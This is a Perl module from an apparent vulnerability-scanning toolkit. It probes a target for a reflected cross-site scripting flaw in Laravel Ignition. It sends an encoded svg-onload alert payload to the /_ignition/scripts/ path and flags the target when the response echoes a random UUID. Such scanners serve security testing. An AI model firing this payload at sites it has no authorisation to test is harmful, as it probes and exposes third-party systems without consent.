package Spellbook::Advisory::Laravel_Ignition_XSS {
    use strict;
    use warnings;
    use Spellbook::Core::UserAgent;
    use Spellbook::Helper::Generate_UUID;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @results);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"     => \$help,
            "t|target=s" => \$target
        );

        if ($target) {
            if ($target !~ /^http(s)?:\/\//) {
                $target = "https://$target";
            }
            
            my @uuid      = Spellbook::Helper::Generate_UUID -> new(["--version" => 4, "--repeat" => 1]);
            my $payload   = "$target/_ignition/scripts/--%3E%3Csvg%20onload=alert%28$uuid[0]%29%3E";
            my $userAgent = Spellbook::Core::UserAgent -> new();
            my $request   = $userAgent -> get($payload);

            if (
                $request -> code() == 500 &&
                $request -> content() =~ m/Undefined index:/ &&
                $request -> content() =~ m/$uuid[0]/
            ) {
                push @results, $target;
            }
            
            return @results;
        }

        if ($help) {
            return "
                \rAdvisory::CVE_
                \r=======================
                \r-h, --help     See this menu
                \r-t, --target   Define a target\n\n";
        }

        return 0;
    }
}

1;